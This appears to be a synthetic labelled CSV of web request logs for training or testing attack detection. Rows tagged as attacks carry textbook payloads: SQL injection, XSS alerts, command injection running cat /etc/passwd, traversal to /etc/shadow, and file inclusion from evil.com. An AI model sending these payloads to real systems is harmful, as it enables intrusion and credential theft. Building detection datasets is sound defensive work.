timestamp,ip,method,url,status_code,user_agent,is_attack,attack_type
2025-04-30 07:57:22,10.0.0.39,GET,/img/..%2F..%2F..%2Fetc%2Fshadow,200,python-requests/2.25,True,directory_traversal
2025-04-30 07:57:22,192.168.0.122,POST,/dashboard,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.105,POST,/login?user=admin'--,500,Mozilla/5.0,True,sql_injection
2025-04-30 07:57:22,10.0.0.139,POST,/ping?ip=127.0.0.1;ls,500,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,192.168.0.47,POST,/about,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.193,GET,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,500,sqlmap/1.5,True,xss
2025-04-30 07:57:22,192.168.0.171,POST,/,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.173,POST,/ping?ip=127.0.0.1;ls,200,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,192.168.0.85,GET,/js/app.js,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.84,POST,/cmd?exec=cat%20/etc/passwd,403,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,192.168.0.221,GET,/vendor/bootstrap.css,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.168,GET,/favicon.ico,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.83,POST,/download?file=../../../../etc/passwd,500,Mozilla/5.0,True,directory_traversal
2025-04-30 07:57:22,192.168.0.162,POST,/,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.73,POST,/js/app.js,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.113,GET,/dashboard,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.111,GET,/vendor/bootstrap.css,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.119,POST,/search?q=<script>alert('x')</script>,500,python-requests/2.25,True,xss
2025-04-30 07:57:22,192.168.0.44,POST,/favicon.ico,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.118,POST,/favicon.ico,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.125,POST,/search?q=<script>alert('x')</script>,403,python-requests/2.25,True,xss
2025-04-30 07:57:22,10.0.0.142,GET,/search?q=<script>alert('x')</script>,403,python-requests/2.25,True,xss
2025-04-30 07:57:22,10.0.0.184,GET,/login?user=admin'--,200,sqlmap/1.5,True,sql_injection
2025-04-30 07:57:22,10.0.0.181,GET,/search?q=1' UNION SELECT null--,403,curl/7.64.1,True,sql_injection
2025-04-30 07:57:22,10.0.0.71,POST,/download?file=../../../../etc/passwd,403,python-requests/2.25,True,directory_traversal
2025-04-30 07:57:22,10.0.0.201,POST,/page?file=http://evil.com/shell.txt,500,curl/7.64.1,True,file_inclusion
2025-04-30 07:57:22,10.0.0.242,GET,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,403,sqlmap/1.5,True,xss
2025-04-30 07:57:22,10.0.0.39,GET,/ping?ip=127.0.0.1;ls,500,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,10.0.0.178,GET,/cmd?exec=cat%20/etc/passwd,403,curl/7.64.1,True,command_injection
2025-04-30 07:57:22,10.0.0.174,POST,/ping?ip=127.0.0.1;ls,403,python-requests/2.25,True,command_injection
2025-04-30 07:57:22,10.0.0.190,GET,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,403,Mozilla/5.0,True,xss
2025-04-30 07:57:22,192.168.0.72,GET,/css/style.css,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.34,GET,/search?q=<script>alert('x')</script>,200,Mozilla/5.0,True,xss
2025-04-30 07:57:22,10.0.0.236,POST,/login?user=admin'--,200,python-requests/2.25,True,sql_injection
2025-04-30 07:57:22,10.0.0.41,GET,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,500,python-requests/2.25,True,xss
2025-04-30 07:57:22,10.0.0.220,GET,/product?id=10 OR 1=1,403,curl/7.64.1,True,sql_injection
2025-04-30 07:57:22,10.0.0.69,GET,/search?q=1' UNION SELECT null--,200,Mozilla/5.0,True,sql_injection
2025-04-30 07:57:22,192.168.0.15,POST,/contact,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.85,GET,/about,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.61,GET,/js/app.js,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.96,POST,/img/..%2F..%2F..%2Fetc%2Fshadow,200,python-requests/2.25,True,directory_traversal
2025-04-30 07:57:22,192.168.0.220,POST,/contact,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.182,POST,/download?file=../../../../etc/passwd,500,sqlmap/1.5,True,directory_traversal
2025-04-30 07:57:22,10.0.0.47,GET,/ping?ip=127.0.0.1;ls,403,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,192.168.0.67,GET,/css/style.css,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.185,GET,/download?file=../../../../etc/passwd,403,python-requests/2.25,True,directory_traversal
2025-04-30 07:57:22,10.0.0.148,POST,/view?include=../../../../etc/passwd,403,sqlmap/1.5,True,file_inclusion
2025-04-30 07:57:22,192.168.0.30,GET,/img/logo.png,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.181,GET,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,500,curl/7.64.1,True,xss
2025-04-30 07:57:22,192.168.0.130,GET,/index.html,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.165,GET,/search?q=<script>alert('x')</script>,500,sqlmap/1.5,True,xss
2025-04-30 07:57:22,192.168.0.85,GET,/favicon.ico,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.83,GET,/download?file=../../../../etc/passwd,403,python-requests/2.25,True,directory_traversal
2025-04-30 07:57:22,192.168.0.53,POST,/,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.33,POST,/about,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.103,POST,/about,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.215,POST,/ping?ip=127.0.0.1;ls,200,python-requests/2.25,True,command_injection
2025-04-30 07:57:22,192.168.0.3,GET,/about,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.23,POST,/download?file=../../../../etc/passwd,200,sqlmap/1.5,True,directory_traversal
2025-04-30 07:57:22,10.0.0.11,POST,/img/..%2F..%2F..%2Fetc%2Fshadow,500,sqlmap/1.5,True,directory_traversal
2025-04-30 07:57:22,10.0.0.16,GET,/search?q=<script>alert('x')</script>,403,python-requests/2.25,True,xss
2025-04-30 07:57:22,10.0.0.43,POST,/cmd?exec=cat%20/etc/passwd,200,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,192.168.0.146,GET,/,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.175,GET,/cmd?exec=cat%20/etc/passwd,403,curl/7.64.1,True,command_injection
2025-04-30 07:57:22,192.168.0.12,GET,/js/app.js,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.75,POST,/page?file=http://evil.com/shell.txt,200,python-requests/2.25,True,file_inclusion
2025-04-30 07:57:22,10.0.0.203,GET,/login?user=admin'--,500,curl/7.64.1,True,sql_injection
2025-04-30 07:57:22,192.168.0.185,GET,/vendor/bootstrap.css,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.209,POST,/contact,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.52,POST,/css/style.css,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.118,POST,/img/..%2F..%2F..%2Fetc%2Fshadow,403,Mozilla/5.0,True,directory_traversal
2025-04-30 07:57:22,10.0.0.201,POST,/search?q=<script>alert('x')</script>,500,Mozilla/5.0,True,xss
2025-04-30 07:57:22,192.168.0.137,GET,/js/app.js,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.44,GET,/ping?ip=127.0.0.1;ls,200,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,10.0.0.1,POST,/download?file=../../../../etc/passwd,500,curl/7.64.1,True,directory_traversal
2025-04-30 07:57:22,10.0.0.15,GET,/ping?ip=127.0.0.1;ls,403,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,192.168.0.112,GET,/contact,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.207,GET,/about,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.114,POST,/about,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.16,GET,/img/logo.png,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.149,GET,/ping?ip=127.0.0.1;ls,500,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,10.0.0.189,POST,/page?file=http://evil.com/shell.txt,500,sqlmap/1.5,True,file_inclusion
2025-04-30 07:57:22,192.168.0.213,GET,/,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.136,GET,/dashboard,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.166,POST,/cmd?exec=cat%20/etc/passwd,500,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,10.0.0.139,POST,/img/..%2F..%2F..%2Fetc%2Fshadow,500,curl/7.64.1,True,directory_traversal
2025-04-30 07:57:22,10.0.0.19,GET,/img/..%2F..%2F..%2Fetc%2Fshadow,403,curl/7.64.1,True,directory_traversal
2025-04-30 07:57:22,192.168.0.221,POST,/index.html,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.86,POST,/page?file=http://evil.com/shell.txt,200,python-requests/2.25,True,file_inclusion
2025-04-30 07:57:22,10.0.0.150,GET,/ping?ip=127.0.0.1;ls,200,python-requests/2.25,True,command_injection
2025-04-30 07:57:22,192.168.0.123,POST,/contact,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.226,GET,/dashboard,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.87,GET,/img/logo.png,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.5,GET,/vendor/bootstrap.css,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.236,GET,/page?file=http://evil.com/shell.txt,200,Mozilla/5.0,True,file_inclusion
2025-04-30 07:57:22,10.0.0.48,POST,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,500,sqlmap/1.5,True,xss
2025-04-30 07:57:22,192.168.0.248,GET,/index.html,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.127,POST,/page?file=http://evil.com/shell.txt,403,Mozilla/5.0,True,file_inclusion
2025-04-30 07:57:22,192.168.0.113,GET,/about,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.202,GET,/css/style.css,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.34,POST,/view?include=../../../../etc/passwd,403,Mozilla/5.0,True,file_inclusion
2025-04-30 07:57:22,10.0.0.172,POST,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,403,curl/7.64.1,True,xss
2025-04-30 07:57:22,192.168.0.159,GET,/dashboard,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.175,POST,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,500,python-requests/2.25,True,xss
2025-04-30 07:57:22,192.168.0.156,POST,/about,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.160,GET,/vendor/bootstrap.css,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.169,GET,/js/app.js,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.92,POST,/cmd?exec=cat%20/etc/passwd,500,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,192.168.0.244,GET,/,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.151,POST,/img/..%2F..%2F..%2Fetc%2Fshadow,500,Mozilla/5.0,True,directory_traversal
2025-04-30 07:57:22,10.0.0.230,POST,/search?q=<script>alert('x')</script>,500,python-requests/2.25,True,xss
2025-04-30 07:57:22,192.168.0.87,POST,/vendor/bootstrap.css,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.120,GET,/login?user=admin'--,200,sqlmap/1.5,True,sql_injection
2025-04-30 07:57:22,10.0.0.192,GET,/cmd?exec=cat%20/etc/passwd,500,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,10.0.0.82,POST,/cmd?exec=cat%20/etc/passwd,500,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,10.0.0.248,POST,/page?file=http://evil.com/shell.txt,200,python-requests/2.25,True,file_inclusion
2025-04-30 07:57:22,192.168.0.90,GET,/index.html,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.164,GET,/css/style.css,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.141,GET,/product?id=10 OR 1=1,500,sqlmap/1.5,True,sql_injection
2025-04-30 07:57:22,192.168.0.242,POST,/img/logo.png,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.172,GET,/login?user=admin'--,500,Mozilla/5.0,True,sql_injection
2025-04-30 07:57:22,10.0.0.215,POST,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,500,Mozilla/5.0,True,xss
2025-04-30 07:57:22,192.168.0.142,POST,/index.html,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.124,GET,/ping?ip=127.0.0.1;ls,200,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,192.168.0.115,GET,/img/logo.png,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.23,POST,/product?id=10 OR 1=1,500,Mozilla/5.0,True,sql_injection
2025-04-30 07:57:22,192.168.0.12,POST,/js/app.js,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.255,GET,/login?user=admin'--,403,Mozilla/5.0,True,sql_injection
2025-04-30 07:57:22,10.0.0.110,GET,/product?id=10 OR 1=1,500,Mozilla/5.0,True,sql_injection
2025-04-30 07:57:22,192.168.0.128,GET,/contact,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.157,GET,/cmd?exec=cat%20/etc/passwd,500,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,10.0.0.245,POST,/cmd?exec=cat%20/etc/passwd,500,python-requests/2.25,True,command_injection
2025-04-30 07:57:22,10.0.0.50,POST,/ping?ip=127.0.0.1;ls,200,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,10.0.0.214,GET,/login?user=admin'--,500,Mozilla/5.0,True,sql_injection
2025-04-30 07:57:22,10.0.0.108,GET,/product?id=10 OR 1=1,500,curl/7.64.1,True,sql_injection
2025-04-30 07:57:22,192.168.0.56,GET,/dashboard,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.126,POST,/profile,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.238,GET,/cmd?exec=cat%20/etc/passwd,403,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,192.168.0.60,GET,/favicon.ico,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.26,POST,/login?user=admin'--,500,sqlmap/1.5,True,sql_injection
2025-04-30 07:57:22,192.168.0.173,POST,/dashboard,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.44,POST,/,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.236,POST,/index.html,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.153,POST,/js/app.js,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.68,GET,/favicon.ico,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.36,GET,/vendor/bootstrap.css,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.166,GET,/ping?ip=127.0.0.1;ls,200,python-requests/2.25,True,command_injection
2025-04-30 07:57:22,192.168.0.89,GET,/index.html,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.79,POST,/,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.121,GET,/vendor/bootstrap.css,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.173,GET,/login?user=admin'--,200,sqlmap/1.5,True,sql_injection
2025-04-30 07:57:22,10.0.0.68,POST,/view?include=../../../../etc/passwd,500,sqlmap/1.5,True,file_inclusion
2025-04-30 07:57:22,192.168.0.100,GET,/contact,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.105,GET,/,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.254,POST,/js/app.js,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.88,GET,/cmd?exec=cat%20/etc/passwd,403,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,192.168.0.56,GET,/about,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.2,GET,/js/app.js,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.41,GET,/vendor/bootstrap.css,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.75,POST,/about,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.190,POST,/cmd?exec=cat%20/etc/passwd,500,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,10.0.0.73,GET,/download?file=../../../../etc/passwd,403,Mozilla/5.0,True,directory_traversal
2025-04-30 07:57:22,10.0.0.194,POST,/img/..%2F..%2F..%2Fetc%2Fshadow,200,sqlmap/1.5,True,directory_traversal
2025-04-30 07:57:22,10.0.0.200,GET,/product?id=10 OR 1=1,200,curl/7.64.1,True,sql_injection
2025-04-30 07:57:22,192.168.0.44,GET,/,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.247,POST,/vendor/bootstrap.css,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.248,POST,/cmd?exec=cat%20/etc/passwd,200,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,192.168.0.198,GET,/js/app.js,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.219,POST,/cmd?exec=cat%20/etc/passwd,500,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,10.0.0.249,POST,/page?file=http://evil.com/shell.txt,500,python-requests/2.25,True,file_inclusion
2025-04-30 07:57:22,192.168.0.93,GET,/img/logo.png,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.228,POST,/profile,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.189,GET,/download?file=../../../../etc/passwd,403,python-requests/2.25,True,directory_traversal
2025-04-30 07:57:22,192.168.0.128,GET,/,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.51,GET,/login?user=admin'--,500,python-requests/2.25,True,sql_injection
2025-04-30 07:57:22,192.168.0.52,GET,/img/logo.png,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.208,GET,/vendor/bootstrap.css,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.85,POST,/img/..%2F..%2F..%2Fetc%2Fshadow,200,python-requests/2.25,True,directory_traversal
2025-04-30 07:57:22,192.168.0.240,GET,/contact,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.166,POST,/css/style.css,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.81,POST,/cmd?exec=cat%20/etc/passwd,500,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,192.168.0.95,GET,/favicon.ico,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.216,GET,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,200,Mozilla/5.0,True,xss
2025-04-30 07:57:22,10.0.0.171,POST,/img/..%2F..%2F..%2Fetc%2Fshadow,200,Mozilla/5.0,True,directory_traversal
2025-04-30 07:57:22,10.0.0.244,GET,/download?file=../../../../etc/passwd,403,Mozilla/5.0,True,directory_traversal
2025-04-30 07:57:22,10.0.0.190,POST,/search?q=<script>alert('x')</script>,500,python-requests/2.25,True,xss
2025-04-30 07:57:22,10.0.0.230,POST,/img/..%2F..%2F..%2Fetc%2Fshadow,500,python-requests/2.25,True,directory_traversal
2025-04-30 07:57:22,10.0.0.81,GET,/page?file=http://evil.com/shell.txt,403,sqlmap/1.5,True,file_inclusion
2025-04-30 07:57:22,10.0.0.221,GET,/product?id=10 OR 1=1,403,sqlmap/1.5,True,sql_injection
2025-04-30 07:57:22,10.0.0.19,POST,/login?user=admin'--,500,python-requests/2.25,True,sql_injection
2025-04-30 07:57:22,10.0.0.203,GET,/img/..%2F..%2F..%2Fetc%2Fshadow,200,python-requests/2.25,True,directory_traversal
2025-04-30 07:57:22,10.0.0.129,GET,/img/..%2F..%2F..%2Fetc%2Fshadow,200,Mozilla/5.0,True,directory_traversal
2025-04-30 07:57:22,192.168.0.27,POST,/dashboard,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.177,GET,/favicon.ico,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.107,POST,/favicon.ico,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.45,GET,/about,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.144,POST,/,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.20,GET,/cmd?exec=cat%20/etc/passwd,500,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,192.168.0.66,GET,/img/logo.png,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.110,POST,/search?q=<script>alert('x')</script>,500,curl/7.64.1,True,xss
2025-04-30 07:57:22,10.0.0.255,GET,/search?q=<script>alert('x')</script>,403,Mozilla/5.0,True,xss
2025-04-30 07:57:22,192.168.0.194,GET,/img/logo.png,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.210,GET,/img/..%2F..%2F..%2Fetc%2Fshadow,403,Mozilla/5.0,True,directory_traversal
2025-04-30 07:57:22,10.0.0.168,POST,/download?file=../../../../etc/passwd,500,curl/7.64.1,True,directory_traversal
2025-04-30 07:57:22,192.168.0.241,GET,/index.html,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.105,POST,/search?q=1' UNION SELECT null--,500,Mozilla/5.0,True,sql_injection
2025-04-30 07:57:22,192.168.0.89,GET,/,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.22,POST,/js/app.js,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.231,GET,/download?file=../../../../etc/passwd,403,curl/7.64.1,True,directory_traversal
2025-04-30 07:57:22,192.168.0.29,GET,/js/app.js,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.81,POST,/contact,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.179,GET,/cmd?exec=cat%20/etc/passwd,500,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,10.0.0.9,GET,/view?include=../../../../etc/passwd,500,curl/7.64.1,True,file_inclusion
2025-04-30 07:57:22,10.0.0.191,GET,/view?include=../../../../etc/passwd,500,Mozilla/5.0,True,file_inclusion
2025-04-30 07:57:22,192.168.0.27,POST,/favicon.ico,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.53,GET,/page?file=http://evil.com/shell.txt,500,python-requests/2.25,True,file_inclusion
2025-04-30 07:57:22,192.168.0.206,POST,/dashboard,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.108,POST,/css/style.css,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.135,GET,/login?user=admin'--,200,python-requests/2.25,True,sql_injection
2025-04-30 07:57:22,192.168.0.129,POST,/,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.17,GET,/about,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.167,GET,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,500,Mozilla/5.0,True,xss
2025-04-30 07:57:22,10.0.0.29,GET,/page?file=http://evil.com/shell.txt,500,sqlmap/1.5,True,file_inclusion
2025-04-30 07:57:22,192.168.0.105,GET,/img/logo.png,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.170,POST,/,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.84,POST,/ping?ip=127.0.0.1;ls,403,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,10.0.0.222,GET,/cmd?exec=cat%20/etc/passwd,200,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,10.0.0.56,GET,/ping?ip=127.0.0.1;ls,500,curl/7.64.1,True,command_injection
2025-04-30 07:57:22,10.0.0.143,GET,/search?q=<script>alert('x')</script>,200,curl/7.64.1,True,xss
2025-04-30 07:57:22,192.168.0.21,POST,/dashboard,200,Mozilla/5.0,False,normal
